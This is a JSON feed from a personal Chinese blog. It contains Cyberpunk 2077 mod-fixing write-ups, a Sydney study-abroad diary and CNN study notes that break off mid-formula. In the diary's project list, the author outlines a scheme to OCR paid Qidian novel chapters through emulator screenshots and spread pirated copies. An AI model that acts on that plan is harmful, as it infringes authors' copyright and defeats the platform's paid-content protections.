{
    "version": "https://jsonfeed.org/version/1",
    "title": "Prism Port",
    "description": "",
    "home_page_url": "https://www.sycamore.top",
    "items": [
        {
            "id": "https://www.sycamore.top/Mod-Develop/Cyberpunk-2077/Ciri%20Main%20Menu%20Background/",
            "url": "https://www.sycamore.top/Mod-Develop/Cyberpunk-2077/Ciri%20Main%20Menu%20Background/",
            "title": "希里的 CP2077 主菜单背景",
            "date_published": "2024-11-05T14:56:23.000Z",
            "content_html": "<p>我试图在 2.0+ 版本中修复 mod: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmV4dXNtb2RzLmNvbS9jeWJlcnB1bmsyMDc3L21vZHMvMjU0MQ==\">Ciri in Night City - Main Menu Background Replacer</span>，添加对往日之影 Logo 的支持。</p>\n<p>Update 1.1.0：v1.0.0 中，载入游戏时的动画消失了，我将其修复，但最后一个动画也会变成被更改的主菜单背景</p>\n<blockquote>\n<p><strong>写在前面</strong>：加载动画丢失的问题，归根到底是因为这个原 Mod 对背景的修改手段太粗暴了，而往日之影 Logo 缺失，则是因为这个 Mod 过期了。</p>\n<p>如果想修复丢失的加载动画，直接跳到 “找回丢失的加载动画” 阅读就行。<br />\n这一节将从头开始构建这个 Mod。</p>\n</blockquote>\n<hr />\n<p>原 Mod 启动效果图，可以看到没有往日之影的 logo：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1730815548/Typera/2024/11/c42fe5caab097e56ca6115aa25028bde.png\" alt=\"image-20241106010540801\" /></p>\n<hr />\n<h1 id=\"logo-的修改方法\"><a class=\"anchor\" href=\"#logo-的修改方法\">#</a> Logo 的修改方法</h1>\n<p><strong>修改工具</strong>：WolvenKit</p>\n<h2 id=\"往日之影-logo-补充\"><a class=\"anchor\" href=\"#往日之影-logo-补充\">#</a> 往日之影 Logo 补充</h2>\n<p>打开 Mod Browser，找到安装好的原 Mod</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1730998112/Typera/2024/11/5d8a49a1184590d333259cd53e8847dd.png\" alt=\"image-20241108034829519\" /></p>\n<p>选择 base 文件夹，然后鼠标右键 Add selected items to project</p>\n<p>左侧 Project Explorer 中找到 menu_background.xbm 和  menu_background_1080p.xbm，这是出问题的文件，直接删掉就行，如下：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1730998166/Typera/2024/11/f508d2dcb910791026ac4f0cf9bfa3e5.png\" alt=\"image-20241108034923672\" /></p>\n<h2 id=\"最后的工作打包\"><a class=\"anchor\" href=\"#最后的工作打包\">#</a> 最后的工作：打包</h2>\n<p>Buid -&gt; Pack Project，会在项目文件夹下打包为 zip 压缩包，这就是修复好的 Mod，安装到 CP2077，并卸载掉原 Mod。</p>\n<p>效果如下，成功补上往日之影的 Logo：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1730822474/Typera/2024/11/fbc6ffdfb07adb1f77abc0edd380520e.png\" alt=\"image-20241106030106133\" /></p>\n<h1 id=\"分析原-mod\"><a class=\"anchor\" href=\"#分析原-mod\">#</a> 分析原 Mod</h1>\n<p>最好先阅读：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zeWNhbW9yZS50b3AvTW9kLURldmVsb3AvQ3liZXJwdW5rLTIwNzcvYXJjaGl2ZSVFNSU4NiU4NSVFNSVBRSVCOSVFOCVBNyVBMyVFNiU5RSU5MA==\">archive 内容解析</span></p>\n<p>我的分析过程其实绕了很大的弯子，有兴趣可以看一下。</p>\n<h2 id=\"定位背景图片的位置\"><a class=\"anchor\" href=\"#定位背景图片的位置\">#</a> 定位背景图片的位置</h2>\n<p>原 Mod 修改的文件还是有很多的，为了找到正确的思路，我选择先定位被修改的背景图片。</p>\n<hr />\n<p>根据游戏主线进度不同，赛博朋克的主菜单背景会更换图片。</p>\n<p>寻找后，我发现对应的目录： <code>base\\gameplay\\gui\\world\\loading_screens\\</code></p>\n<p>该目录下所谓 loading_screen_5_after_q101、loading_screen_10_after_q112，应该对应了主线中某些事件的发生，比如图片 loading_screen_10_after_q112\\loading_screen_10_shot_01.xbm：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1730812872/Typera/2024/11/3609b16ee976bb030b37db1649a51d31.png\" alt=\"image-20241106002108908\" /></p>\n<p>这显然是在潜入山车安装病毒之后会出现的那个背景图。</p>\n<p>再比如图片 loading_screen_5_after_q101\\loading_screen_5_shot_01.xbm：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1730809719/Typera/2024/11/ffbe63923183b7d8602c1046d1bc2b84.png\" alt=\"image-20241105232833312\" /></p>\n<p>这对应目前我的主菜单图片：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1730809840/Typera/2024/11/a4e7e61df94dc872b29a72dd4b9fe6ba.png\" alt=\"image-20241105233029146\" /></p>\n<h2 id=\"进一步分析-inkwidget\"><a class=\"anchor\" href=\"#进一步分析-inkwidget\">#</a> 进一步分析 inkwidget</h2>\n<p>如果我要更换这个主菜单的背景图片，应该需要更改对应的 inkwidget 中的内容。</p>\n<p>原 mod 虽然不能显示往日之影的 logo，但是背景替换功能还是正常的，因此可以做一定的参考。</p>\n<p>着重分析：loading_screen_5_after_q101.inkwidget，因为这对应目前我主菜单的背景图片，方便我进行分析。这里面应该包括构成当前主菜单界面的资源。</p>\n<p>左：原文件；右：原 Mod 中修改后的文件</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1730813070/Typera/2024/11/a23b9f1dc9b8ff26b6639b55bb702376.png\" alt=\"image-20241106002427225\" /></p>\n<p>先看右侧的原 Mod 文件，主要是文件 cp_bq_alphafaded.bk2，这就是被替换的希里背景动画。</p>\n<p>然后看左侧的游戏原文件，因为目前我的主菜单背景是 short01 的图片，所以不看 short02、short03 的内容：</p>\n<p><strong>smoke_loop.bk2</strong>：一个冒烟的动画视频</p>\n<p><strong>shot_01_assets.inkatlas</strong>：对文件 short_01_assets.xbm 进行了分割，提取出图片后面的三个光柱（ad）以及闪烁的灯光（antenna_lights）</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1730814251/Typera/2024/11/28b987b84f447477c8c464cf7621f2cc.png\" alt=\"image-20241106004409120\" /></p>\n<p>short_01_assets.xbm 如下，应该能理解我的意思：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1730814533/Typera/2024/11/01b0e79632d94fc3339833106b191ccf.png\" alt=\"image-20241106004850267\" /></p>\n<p><strong>loading_screen_5_shot_01.inkatlas</strong>：对应为主体背景，因为分割的那 4 个参数 Bottom、Left...，分别设置为了 0 和 1，也就是顶格分割，取了图片整体。</p>\n<p>如下是对主页面要素的标注，①对应 smoke_loop.bk2，②对应 shot_01_assets.inkatlas：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1730814934/Typera/2024/11/48590ddd97bd03ba9d708ed367fa1ef8.png\" alt=\"image-20241106005529451\" /></p>\n<p>因此，如果只是要更换当前的背景图片，把 loading_screen_5_shot_01.xbm 换掉就行。</p>\n<h2 id=\"原-mod-思路分析\"><a class=\"anchor\" href=\"#原-mod-思路分析\">#</a> 原 Mod 思路分析</h2>\n<p>上一节说换 loading_screen_5_shot_01.xbm，其实是不够的。</p>\n<p>先说第一个原因：背景图片是会跟着主线剧情切换的。</p>\n<p>仔细对比可以发现，Mod 中更改的 loading_screen_5_after_q101.inkwidget，其内容和游戏原文件： base\\gameplay\\gui\\world\\loading_screens\\initial_loading_screen\\initial_loading_screen.inkwidget 完全一致。</p>\n<p>左：Mod 中的文件；右：initial_loading_screen.inkwidget</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1730820048/Typera/2024/11/99b267900fa56628ce107626801cda75.png\" alt=\"image-20241106022045941\" /></p>\n<p>而我们知道，initial_loading_screen.inkwidget 中的 cp_bq_alphafaded.bk2，已经被替换为希里的背景动画了。</p>\n<p>因此 loading_screen_5_after_q101 对应的背景就会被替换为希里。</p>\n<p>再看原 Mod，每一个对应文件夹下的 inkwidget，其内容都被改成了 initial_loading_screen.inkwidget</p>\n<p>所以说原 Mod 的思路很绝：既然背景图片会换，那就把它们都改了！</p>\n<h2 id=\"往日之影-logo-修复点分析\"><a class=\"anchor\" href=\"#往日之影-logo-修复点分析\">#</a> 往日之影 Logo 修复点分析</h2>\n<p>上面分析了这么多其实对修复往日之影的 Logo 完全没用，因为在游戏原文件 loading_screen_5_after_q101.inkwidget 中，我并没有找到 Logo 的部分，上述内容都是原 Mod 更改背景图片的思路。</p>\n<p>但是把已经分析出作用的文件去掉，原 Mod 的结构就简单多了。</p>\n<hr />\n<p>我马上就发现了：base\\gameplay\\gui\\fullscreen\\main_menu\\menu_background.xbm，以及 menu_background_1080p.xbm</p>\n<p>左：原 Mod 中的 menu_background.xbm；右：游戏原目录中的 menu_background.xbm</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1730821292/Typera/2024/11/e99ca6d089324954b2dfb1f94b502241.png\" alt=\"image-20241106024128469\" /></p>\n<p>少了什么一目了然，就是往日之影的 Logo。</p>\n<p>正确的文件游戏里已经有了，现在加载不出来是因为原 Mod 中的文件覆盖了游戏的默认文件。</p>\n<p>因此如果要修复这个 Logo，只要把 Mod 里这两张图片删了就行。</p>\n<h1 id=\"update修复丢失的加载动画\"><a class=\"anchor\" href=\"#update修复丢失的加载动画\">#</a> Update：修复丢失的加载动画</h1>\n<p>先说说修复完 Logo 之后我发现的这个新问题：</p>\n<p>从主菜单载入游戏存档时，一般会播放一个小剧场，和主菜单背景一样，会跟随剧情变化而变化。而问题就是，这个小剧场没了，加载过程全黑。</p>\n<p>这个小剧场其实由三段动画构成。先看看这三段动画的例子：</p>\n<p>动画一：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1731031192/Typera/2024/11/d2aaf1434e40937c6fd9f92d2131d7fc.png\" alt=\"PixPin_2024-11-08_12-59-19\" /></p>\n<p>动画二：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1731035938/Typera/2024/11/fe3589af6f3db84af35d50c00c442090.png\" alt=\"PixPin_2024-11-08_14-18-10\" /></p>\n<p>动画三：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1731035935/Typera/2024/11/96c0c166085ec678bf9a94549e0ab157.png\" alt=\"PixPin_2024-11-08_14-18-28\" /></p>\n<h2 id=\"加载动画丢失原因分析\"><a class=\"anchor\" href=\"#加载动画丢失原因分析\">#</a> 加载动画丢失原因分析</h2>\n<p>之所以加载动画会丢失，究其原因是原 Mod 直接将每一个对应文件夹（loading_screen_5_after_q101）下的 inkwidget，都替换成了 initial_loading_screen.inkwidget。</p>\n<p>这显然会导致很多问题，loading_screen_5_after_q101.inkwidget 是和加载动画相关的关键文件（具体参考 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zeWNhbW9yZS50b3AvTW9kLURldmVsb3AvQ3liZXJwdW5rLTIwNzcvYXJjaGl2ZSVFNSU4NiU4NSVFNSVBRSVCOSVFOCVBNyVBMyVFNiU5RSU5MC8jaW5rd2lkZ2V0\">archive 内容解析 #inkwidget</span>）。</p>\n<p>从下面那张对比图可以看出，loading_screen_5_after_q101.inkwidget 下对应的三个加载动画资源，ls_01，ls_02，ls_03 在 initial_loading_screen.inkwidget 中都没有了，只剩下 main_menu 和 loading_screen。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1731032428/Typera/2024/11/dfc871c9dcc12b9cadeb7ca35624c9e3.png\" alt=\"image-20241108132025115\" /></p>\n<p>而 main_menu 对应 cp_bq_alphafaded.bk2 资源，也就是替换的希里的背景，loading_screen 则是对应另一个进入主菜单时的动画资源。</p>\n<p>因此，游戏找不到 ls_01，ls_02，ls_03，也就丢失了加载动画</p>\n<h2 id=\"加载动画修复方法\"><a class=\"anchor\" href=\"#加载动画修复方法\">#</a> 加载动画修复方法</h2>\n<p>因为上述原因，只能从头构建这个 Mod。</p>\n<p>首先创建一个新项目，和修复 Logo 时差不多，在 Asset Browser 中找到原 Mod 的 cp_bg_alpha_faded.bk2，也就是希里背景，加入到项目中。</p>\n<p>然后找到游戏中的 loading_screen_5_after_q101.inkwidget 和 initial_loading_screen.inkwidget，将前者加入项目，并打开编辑，后者选择 Open without adding to project 即可。</p>\n<p>复制 initial_loading_screen.inkwidget 中的 cp_bq_alphafaded.bk2 资源，然后加入 loading_screen_5_after_q101.inkwidget 的 externalDependenciesForInternalItems 中：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1731034691/Typera/2024/11/a07fb28527c04bf0d6a1fac487d0e1ea.png\" alt=\"image-20241108135807669\" /></p>\n<p>然后进入 ls_01 的 children，删除里面的 1-6 项，这些都是组成原主菜单背景的资源。至于第 0 项 fade_to_black，应该是衔接动画，不能删除，否则会导致主菜单背景动画播放卡顿。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1731034927/Typera/2024/11/f443d45ef51c334045498bbea418f1d1.png\" alt=\"image-20241108140203924\" /></p>\n<p>然后复制 initial_loading_screen.inkwidget 中 main_menu -&gt; children 中的 cp_bg_alpha，这对应希里的背景动画资源，因为对应文件已经做出替换。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1731035051/Typera/2024/11/bc72ba01656cc7c37368d1101c3c08b9.png\" alt=\"image-20241108140408349\" /></p>\n<p>粘贴到 loading_screen_5_after_q101.inkwidget 之前删除其他资源的位置即可：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1731035542/Typera/2024/11/6da47409fffe611ec5d5bc039388b64a.png\" alt=\"image-20241108141218516\" /></p>\n<p>同样的操作，对 loading_screens 中 其他文件夹下的 .inkwidget 都做一遍，就全都能替换掉了。</p>\n<hr />\n<p><strong>唯一的问题</strong>：</p>\n<p>ls_01 对应主菜单背景动画和加载动画三，ls_02 对应加载动画一，ls_03 对应加载动画二。</p>\n<p>因此我为了替换主菜单背景动画，修改了 ls_01，加载动画三不可避免的也会变成希里的背景。暂时没有找到解决方法。</p>\n",
            "tags": [
                "Develop",
                "Mod",
                "CP2077",
                "archive"
            ]
        },
        {
            "id": "https://www.sycamore.top/Mod-Develop/Cyberpunk-2077/archive%E5%86%85%E5%AE%B9%E8%A7%A3%E6%9E%90/",
            "url": "https://www.sycamore.top/Mod-Develop/Cyberpunk-2077/archive%E5%86%85%E5%AE%B9%E8%A7%A3%E6%9E%90/",
            "title": "archive 内容解析",
            "date_published": "2024-11-05T14:56:23.000Z",
            "content_html": "<p>本文内容会有些许凌乱，因为是 Mod 开发过程中，我对 archive 的一些文件代表的内容的想法。</p>\n<p>而且本人没有接触过 3D 动画、游戏制作这方面的内容，描述会存在很多不专业的地方。</p>\n<hr />\n<h1 id=\"文件类型和作用\"><a class=\"anchor\" href=\"#文件类型和作用\">#</a> 文件类型和作用</h1>\n<h2 id=\"xbm\"><a class=\"anchor\" href=\"#xbm\">#</a> xbm</h2>\n<p>这是一种图片类型的文件，对应游戏中出现的一些贴图的资源。</p>\n<p>通过 WolvenKit 可以查看图片的内容，比如 expansion_logo.xbm，如下所示：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1730808788/Typera/2024/11/2c0934a8e3cdb50eaedad5bc5a2c17f0.png\" alt=\"image-20241105231302174\" /></p>\n<h2 id=\"inkatlas\"><a class=\"anchor\" href=\"#inkatlas\">#</a> inkatlas</h2>\n<p>这是某种代表了对 xbm 图片进行具体 ” 分割 “ 利用的文件。</p>\n<p>比如 expansion_logo.xbm 对应的 expansion_logo.inkatlas，内容如下：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1730808890/Typera/2024/11/90a3c1b209806070d39ecdf04f3cd021.png\" alt=\"image-20241105231444965\" /></p>\n<p>再次展开这个 3：logo，并和 4：logo_EN 的数据进行对比，如下：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1730808968/Typera/2024/11/4c4d7b17e1126d72bd67023217ae420f.png\" alt=\"image-20241105231603201\" /></p>\n<p>可以看到，其中包括的 Bottom、Left、Right、Top，对应的应该是 xbm 图片中 ” 被分割 “ 出来的具体图片的位置数据，这些数据被框定在 0~1 中。</p>\n<p>以下是我根据这些数据判断他们所对应图片的思路：</p>\n<p>3：logo 的 Bottom 和 4：logo_EN 的 Top 数值接近，几乎可以认为其就是上下相邻的两个图形。<br />\n他们的 Bottom 和 Top 数值接近于 1，因此应当位于 xbm 图片的下侧。<br />\n他们的 Left 数值相等且接近于 0，因此应当位于 xbm 图片的最左侧。</p>\n<p>所以，3：logo 和 4：logo_EN 应当分别对应 xbm 图片左下方的两个英文 logo: PHANTOM LIBERTY</p>\n<h2 id=\"inkwidget\"><a class=\"anchor\" href=\"#inkwidget\">#</a> inkwidget</h2>\n<p>这个文件应该是说明了，组成某些动画需要用到的资源。</p>\n<p>以 loading_screen_5_after_q101.inkwidget 为例，该文件应该对应某个从主菜单载入游戏时的小剧场，该小剧场通常由三个动画组成。</p>\n<p>如下图所示，externalDependenciesForInternalItems 下存放的就是要用到的内部资源。libraryItems 下的就是组成动画的一些信息，ls_01，ls_02，ls_03 对应三个加载动画。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1731032972/Typera/2024/11/ed815477f0502d01327d6c8fd694ca6a.png\" alt=\"image-20241108132929030\" /></p>\n<p>展开 ls_01，以此为例说明这个 node 中的信息。</p>\n<p>关键内容在 如下图所示的 children 中，可以看到一共有 7 项，从其名称中应该可以发现一些端倪。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1731033157/Typera/2024/11/fb1bf0564b6749bc6c8d22e2dcad17f2.png\" alt=\"image-20241108133234564\" /></p>\n<p>比如 shot_01_bg 对应这段动画的背景，antena_light_1 对应一个闪烁的信号灯。它们具体代表的资源，可以进一步展开这些项目获得。</p>\n<p>以 ls_02 中的 BINK_RTW 为例，展开后可以看到对应的 videoResouce 文件。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1731033675/Typera/2024/11/9357c4afea9961b5a46f861d1ddf4906.png\" alt=\"image-20241108134111623\" /></p>\n<p>如果想知道它对应什么，就将这个 videoResource Add to Project，然后用 rad video 播放，其内容为：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1731033856/Typera/2024/11/7ecc5753dbb2a7e5f44a2e08d451b207.png\" alt=\"image-20241108134412959\" /></p>\n<p>相信你还记得那个 齐格・Q 和 NCPD 发言人。</p>\n<hr />\n<h1 id=\"目录对应的功能\"><a class=\"anchor\" href=\"#目录对应的功能\">#</a> 目录对应的功能</h1>\n<h2 id=\"basegameplayguiworldloading_screens\"><a class=\"anchor\" href=\"#basegameplayguiworldloading_screens\">#</a>  <code>base\\gameplay\\gui\\world\\loading_screens\\</code></h2>\n<p>根据游戏主线进度不同，赛博朋克的主菜单背景会更换图片；加载存档时，会出现多张图片轮换播放。</p>\n<p>比如图片：loading_screen_5_after_q101\\loading_screen_5_shot_01.xbm</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1730809719/Typera/2024/11/ffbe63923183b7d8602c1046d1bc2b84.png\" alt=\"image-20241105232833312\" /></p>\n<p>可以在主菜单看到同样的图片：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1730809840/Typera/2024/11/a4e7e61df94dc872b29a72dd4b9fe6ba.png\" alt=\"image-20241105233029146\" /></p>\n<p>因此，如果我要更换这个主菜单的背景图片，需要更改对应的 inkwidget 中的内容。</p>\n<p>（后续分析：[希里的 CP2077 主菜单背景](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zeWNhbW9yZS50b3AvTW9k\">https://sycamore.top/Mod</span> Develop/Cyberpunk 2077/Ciri Main Menu Background/)）</p>\n",
            "tags": [
                "Develop",
                "Mod",
                "CP2077",
                "archive"
            ]
        },
        {
            "id": "https://www.sycamore.top/Mod-Develop/Cyberpunk-2077/Weapon%20Inspection/",
            "url": "https://www.sycamore.top/Mod-Develop/Cyberpunk-2077/Weapon%20Inspection/",
            "title": "武器验视 Mod",
            "date_published": "2024-11-05T06:05:53.000Z",
            "content_html": "<p>开发中：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25vbmVTeWNhbW9yZS9XZWFwb24tSW5zcGVjdGlvbi1DUDIwNzc=\">noneSycamore/Weapon-Inspection-CP2077</span></p>\n",
            "tags": [
                "Develop",
                "Mod",
                "CP2077"
            ]
        },
        {
            "id": "https://www.sycamore.top/Diary/2024-11-05/",
            "url": "https://www.sycamore.top/Diary/2024-11-05/",
            "title": "留学近况",
            "date_published": "2024-11-05T03:05:53.000Z",
            "content_html": "<p>简单说一下吧，USYD，Master of Computer Science (adv.)，目前是 24S2 末尾，临近考试。</p>\n<h1 id=\"学习\"><a class=\"anchor\" href=\"#学习\">#</a> 学习</h1>\n<p>学习时间很紧张，这边注重实践，虽然 report 也不少。</p>\n<p>平时课程分为 Lecture 和 Tutorial，Lec 可以理解为大课，一个教授对很多学生讲，Tut 可以理解为组织很小的偏实践课，一般是一个 tutor 对 十来个学生。</p>\n<p>作业很多，assignment 一个接一个，通常让我很头疼，尤其是有些课每周还有固定的任务，平时闲不下来，双休日还得余出一天写作业。</p>\n<p>但收获也很多，虽然有不少对提升学识毫无意义的 report，但也起码提升了我的英语写作技巧。何况 report 终究是少数，不少 assignment 还是非常有趣，又有相当的指导作用的。</p>\n<h1 id=\"生活\"><a class=\"anchor\" href=\"#生活\">#</a> 生活</h1>\n<p>和国内相比，物价基本 × 5，虽然有些东西价格差不多，但大部分都是如此。</p>\n<p>普通的一天，如果只考虑吃，核算下来大概花费 150+ 人民币，也不是不能接受。</p>\n<p>就是房租过于离谱，一周 2100，一个月 8400，这基本是悉尼这边的最低价了，再低就得抢为数不多的学校宿舍，但也要一周 1600 左右，还是太贵了。</p>\n<h1 id=\"娱乐\"><a class=\"anchor\" href=\"#娱乐\">#</a> 娱乐</h1>\n<p>巫师三打完本体和石之心就电子阳痿了，甚至黑神话买了都还没玩...</p>\n<p>但巫师三真的是一款好游戏，虽然是十年前的，画质材质比不上现在的游戏，但无论是剧情还是机制，或者战斗系统，都非常有趣。尤其是剧情，不同的选择会带来很多的可能性，头一回，我体会到了什么是网状的剧情结构，而且每个小支线，小委托都很有意思。</p>\n<p>哦，当然还有不得不提一嘴的昆特牌🐶。</p>\n<p>难怪赛博朋克 2077 一直被吐槽有失蠢驴的水准，虽然也有发售时 bug 满天飞的缘故，但有一说一，即使现在的 bug 情况已经很不错了，剧情上真的和巫师三比不了一点。<br />\n（往日之影还不错）</p>\n<h1 id=\"暑期的计划\"><a class=\"anchor\" href=\"#暑期的计划\">#</a> 暑期的计划</h1>\n<p>主体计划是跟一个学校的项目，但应该还是轻松的（相比现在来说）</p>\n<p>所以我还准备利用其他时间，写一些我想写的代码。</p>\n<p>列在这里的，主要是学习或是生活中，突然蹦出来的一些想法，且经过简单的研究，大概是存在实现可能性的。按兴趣从高到低排序：</p>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_0\" disabled=\"true\" /><label for=\"cbx_0\"> <strong>赛博朋克 2077 的 Mod 开发</strong><br />\n巫师三中的希里，曾经穿越到过 CP2077 的世界，我的想法是结合一些已有的 mod，整合出一个希里的 cosplay 集合</label>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_1\" disabled=\"true\" /><label for=\"cbx_1\"> Always First Equip 改进：<br />\n这个 mod 虽然高度可定制化，但还是不符合我的设想，最好是能实现类似 VALORANT 里的武器验视动作的效果</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_2\" disabled=\"true\" /><label for=\"cbx_2\"> 主页菜单背景替换。<br />\n之前有个 mod，但因为进入了 2.0 版本，加入了往日之影，现在已经几乎失效了，我会尝试修复。</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_3\" disabled=\"true\" /><label for=\"cbx_3\"> 希里的服饰<br />\n已经存在类似的 mod，但是第一人称视角下，手部的附着存在相当大的问题，尝试修复。</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_4\" disabled=\"true\" /><label for=\"cbx_4\"> 希里的剑<br />\n在已有的 mod 下改进武器参数。想要在困难难度下依旧能玩得爽一点，还是需要一些加成的🐶。</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_5\" disabled=\"true\" /><label for=\"cbx_5\"> 希里有个标志性的技能，就是按空格突进，在 2077 中有类似的技能。但过场 CG 里其实还可以实现空间转移（这个功能仅仅还只是设想，感觉难度太大）</label></li>\n</ul>\n</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_6\" disabled=\"true\" /><label for=\"cbx_6\"> <strong>游戏存档管理</strong> -&gt; <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21jdGhlc3cvZ2FtZS1zYXZlLW1hbmFnZXI=\">mcthesw/game-save-manager</span><br />\n 之前在该项目早期，我提交过几个功能，现在它已经有 600+ 的 star 了。但看 Issue 里还是有不少人提出改进和新功能，我想看看能不能继续做 Contribution。</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_7\" disabled=\"true\" /><label for=\"cbx_7\"> <strong>小说 OCR</strong><br />\n（其实是不能公开说的）起点小说付费，好像改进了算法。网上的大部分网站，使用爬虫已经爬不太到了，但终究没办法阻止 OCR。<br />\n本机截屏付费章节是不被 App 允许的，但可以用安卓模拟器。用脚本实现模拟点击翻页，然后 Windows 截取固定大小的屏幕，进行 OCR。这样只要有一个人订阅了章节，就可以让别人获得盗版。</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_8\" disabled=\"true\" /><label for=\"cbx_8\"> <strong>字幕翻译</strong>：<br />\n可以和 Windows 自带的 Live Caption 功能集成，需要调用 Windows API，还有翻译源的 API。<br />\nGitHub 上找到了类似功能的项目：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Nha2lSaW5uL0xpdmVDYXB0aW9ucy1UcmFuc2xhdG9y\">SakiRinn/LiveCaptions-Translator</span>，但实际测试中功能很不完善，可以研究然后改进。</label></li>\n</ul>\n",
            "tags": [
                "Diary",
                "Australia"
            ]
        },
        {
            "id": "https://www.sycamore.top/Graduation/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C_/",
            "url": "https://www.sycamore.top/Graduation/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C_/",
            "title": "卷积神经网络",
            "date_published": "2024-02-04T00:09:05.000Z",
            "content_html": "<blockquote>\n<p><strong>解决的问题</strong>：目标检测和识别、分类和检索、超分辨率重构</p>\n<p><strong>核心问题</strong>：如何进行 <mark>特征提取</mark></p>\n</blockquote>\n<hr />\n<h1 id=\"整体架构\"><a class=\"anchor\" href=\"#整体架构\">#</a> 整体架构</h1>\n<p>卷积神经网络 和 传统网络 的<strong>区别</strong>：<br />\nCNN 的输入数据都是 3 维的，不用拉成一个向量<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1707191725/Typera/2024/02/167d0aaa337d6567ec58d764151b8809.png\" alt=\"image-20240206115516342\" /></p>\n<ol>\n<li><strong>输入层</strong>：与传统网络的区别是，直接传入了图像数据（3 维）</li>\n<li><strong>卷积层</strong>：提取特征</li>\n<li><strong>池化层</strong>：数据压缩</li>\n<li><strong>全连接层</strong>：传统神经网络结构；输出层的每一个神经元都与上一层的每一个神经元连接；</li>\n</ol>\n<blockquote>\n<p>每次卷积之后，都会加入一个 <strong>Relu</strong> 激活函数</p>\n<p>卷积层 + 池化层 只是进行特征提取，获得结果还是靠神经网络的全连接层；<br />\n因为全连接层无法直接处理 <strong>多维</strong> 的数据（图像），所以要先把数据拉成 <strong>向量</strong> 的格式</p>\n</blockquote>\n<h2 id=\"卷积\"><a class=\"anchor\" href=\"#卷积\">#</a> 卷积</h2>\n<p>（<mark>提取特征</mark>）</p>\n<p>关于<strong>卷积核</strong> (filter)：参考文章</p>\n<blockquote>\n<p>一次卷积中，</p>\n<ul>\n<li>\n<p>假设输入数据有 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 个维度，则卷积核的维度也应当为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span>（输入数据的每一个维度都对应使用卷积核的一个维度）</p>\n</li>\n<li>\n<p>可以使用多个卷积核。<br />\n每一个卷积核都会对应一个维度的输出数据。假设使用 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span 